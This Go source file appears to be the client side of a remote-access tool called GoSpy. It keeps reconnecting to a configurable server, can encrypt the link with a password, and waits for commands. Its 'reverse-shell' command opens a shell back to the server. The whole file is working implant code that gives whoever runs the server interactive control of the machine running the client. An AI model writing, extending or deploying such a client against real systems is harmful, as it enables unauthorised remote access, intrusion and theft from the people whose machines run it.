package main

import (
	"flag"
	"github.com/psidex/GoSpy/internal/comms"
	"github.com/psidex/GoSpy/internal/gospy/commands"
	"log"
	"net"
	"os"
	"time"
)

var serverAddress string
var serverPassword string

// commandLoop is the loop that receives commands and executes them.
// This should only return an err has occurred and it is impossible to continue as is (i.e. network dropped).
func commandLoop(cm comms.ConnectionManager) (err error) {
	for {
		var messageBytes []byte
		messageBytes, err = cm.RecvBytes()
		if err != nil {
			break
		}

		message := string(messageBytes)
		log.Printf("Recv: %s", message)

		switch message {

		case "exit":
			log.Println("Exiting")
			os.Exit(0)

		case "ping":
			if commands.SendPong(cm) != nil {
				break
			}

		case "reverse-shell":
			// Run in a goroutine so that it can abandoned by the client (e.g. if it hangs forever) and this loop will
			// still respond.
			go commands.StartReverseShell(serverAddress, serverPassword)
		}
	}
	return err
}

func main() {
	address := flag.String("a", "127.0.0.1:12345", "the address (ip:port) of the gospyserver to connect to")
	password := flag.String("p", "", "the password to encrypt network data with")
	flag.Parse()

	serverAddress = *address
	serverPassword = *password

	if serverPassword != "" {
		log.Println("Password supplied, using encrypted connection")
	}

	// If the connection drops it just kicks back this loop.
	for {
		log.Printf("Attempting connection to address: %s\n", serverAddress)
		conn, err := net.DialTimeout("tcp", serverAddress, time.Second*30)
		if err != nil {
			continue
		}

		var cm comms.ConnectionManager

		if serverPassword != "" {
			cm = comms.NewEncryptedConn(conn, serverPassword)
		} else {
			cm = comms.NewPlainConn(conn)
		}

		log.Println("Successful connection")

		err = commandLoop(cm)
		_ = cm.Close() // Just in case.

		log.Printf("Connection dropped: %s\n", err.Error())
	}
}
